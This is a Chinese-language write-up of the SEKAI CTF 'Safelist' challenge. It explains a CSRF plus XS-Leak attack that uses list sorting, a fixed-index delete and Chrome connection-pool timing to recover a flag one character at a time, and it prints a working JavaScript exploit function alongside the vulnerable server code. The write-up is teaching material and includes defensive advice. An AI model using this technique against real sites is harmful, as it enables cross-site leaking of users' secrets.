# Safelist

## 题目简述

题目允许用户创建和删除列表项。管理员 Bot 的同一会话中预先存有 flag；攻击者页面虽然能跨站提交表单，却受同源策略限制，无法直接读取管理员列表。

利用把三个看似普通的行为组合成逐字符 oracle：列表会按字符串排序、删除接口可固定删除索引 0、净化后的 `<img>` 仍可加载同源资源。再通过浏览器全局连接池的拥塞时间判断恶意列表项是否还存在，即可恢复 flag。

## 解题过程

管理员 Bot 首先在目标站创建一个值为 flag 的列表项，再访问攻击者提供的 URL。flag 格式被明确限制为：

```text
^SEKAI{[a-z]+}$
```

服务器的两个关键接口没有 CSRF Token：

```javascript
app.post("/create", (req, res) => {
    req.user.list.push(req.body.text.slice(0, 2048));
    req.user.list.sort();
    res.redirect("/");
});

app.post("/remove", (req, res) => {
    req.user.list.splice(parseInt(req.body.index), 1);
    res.redirect("/");
});
```

页面会用 DOMPurify 清洗列表项后写入 `innerHTML`。脚本执行被拦截，但 `<img src="...">` 仍会保留。CSP 的 `default-src 'self'` 也允许图片请求本站的 `/js/purify.js`。

假设已知 flag 前缀为 $P$，测试字符串为：

```text
P + c + <大量同源 img 标签>
```

创建该条目后，数组按 JavaScript 默认字典序排序，再跨站提交 `/remove` 删除索引 0：

- 若测试项排在 flag 前面，索引 0 是测试项，删除后页面只剩 flag；
- 若测试项排在 flag 后面，索引 0 是 flag，删除后测试项及其中的大量图片仍在页面。

这样就把“候选字符串与 flag 的字典序关系”转化成了“目标页面是否会发起大量图片请求”。

同源策略仍不允许攻击者直接观察这些请求。官方利用采用 [XS-Leaks Connection Pool](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)：Chrome 当时有约 256 个全局 TCP socket。先向不同主机发起 255 个长期不返回的请求，占满除一个以外的连接；随后打开目标页面，再计时若干攻击者可观察的请求。

如果测试项已被删除，目标页只占用很少的网络资源；如果测试项仍在，数十个 `<img>` 会争抢最后一个 socket，使攻击者的计时请求显著变慢。核心流程可概括为：

```javascript
async function test(prefix, candidate) {
    let payload = prefix + candidate;
    for (let i = 0; payload.length < 2048; i++) {
        payload += `<img src="/js/purify.js?${i.toString(36)}">`;
    }

    // 两个表单均指向目标站，并携带管理员 Cookie。
    createForm.elements.text.value = payload;
    createForm.submit();
    await sleep(1000);

    removeForm.elements.index.value = "0";
    removeForm.submit();
    await sleep(500);

    const controller = new AbortController();
    for (let i = 0; i < 255; i++) {
        fetch(
            `http://${i}.sleep.example/sleep/60`,
            {
                mode: "no-cors",
                signal: controller.signal,
            },
        ).catch(() => {});
    }

    window.open(
        "https://safelist.ctf.sekai.team/?cache=" + Math.random(),
        "target",
    );
    await sleep(500);

    const started = performance.now();
    await Promise.all(
        Array.from(
            {length: 5},
            () => fetch("https://example.com", {mode: "no-cors"}),
        ),
    );
    const elapsed = performance.now() - started;
    controller.abort();
    return elapsed;
}
```

实际利用应对每个候选字符重复测量多次并取均值，避免网络抖动。测试字符集按 `_abcdefghijklmnopqrstuvwxyz}` 排序：耗时从“低”跳到“高”的位置反映测试项从排在 flag 之前变成排在 flag 之后。确定一个字符后，把它加入已知前缀，重新让 Bot 访问攻击页并继续下一位。结尾 `}` 需要单独处理，因为 flag 是测试项的严格前缀时，较长的测试项会排在 flag 后面。

逐字符恢复得到：

```text
SEKAI{xsleakyay}
```

README 还列出了两条社交平台上的其他解法，但这些短帖不是理解官方利用所必需，且链接内容不稳定，因此没有保留。正文已经完整说明官方 `solve.html` 使用的排序 oracle、连接池占用和计时判定。

## 方法总结

这题不是传统 XSS。DOMPurify 和 CSP 阻止了脚本执行，却没有消除 HTML 元素产生的网络副作用；跨站表单又允许攻击者修改管理员状态。排序加固定索引删除提供了二值条件，连接池耗时负责把这个条件带回攻击者源。

连接池 XS-Leak 强依赖浏览器版本、全局 socket 上限、HTTP 协议和网络噪声。复现历史题时应使用题目 Bot 对应的 Chromium 环境，并通过重复采样、缓存破坏参数和分离的慢速主机提高信噪比。防御侧则应加入 CSRF 保护、避免让秘密参与攻击者可控排序，并限制净化后 HTML 的资源加载能力。
